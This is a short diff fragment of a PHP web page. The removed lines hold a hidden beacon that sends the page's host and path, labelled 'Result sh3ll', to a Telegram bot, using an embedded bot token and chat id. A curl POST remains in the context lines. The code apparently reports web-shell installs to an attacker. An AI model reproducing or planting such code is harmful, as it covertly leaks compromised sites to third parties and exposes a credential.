@@ -119,17 +119,7 @@ option {
         </font>
 <br><br><br>
 <?php
-$token ='bot6335079070:AAHESBq0Vhqk70t4lxDc49Wb0NcNv_IRNgY';
-$chat_id ='6773720898';
 
-$message = 'Result sh3ll : '.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
-
-$apiUrl = "https://api.telegram.org/bot6335079070:AAHESBq0Vhqk70t4lxDc49Wb0NcNv_IRNgY/sendMessage";
-$data = [
-    'chat_id' => $chat_id,
-    'text' => $message,
-    'parse_mode' => 'Markdown',
-];
 
 $ch = curl_init($apiUrl);
 curl_setopt($ch, CURLOPT_POST, 1);
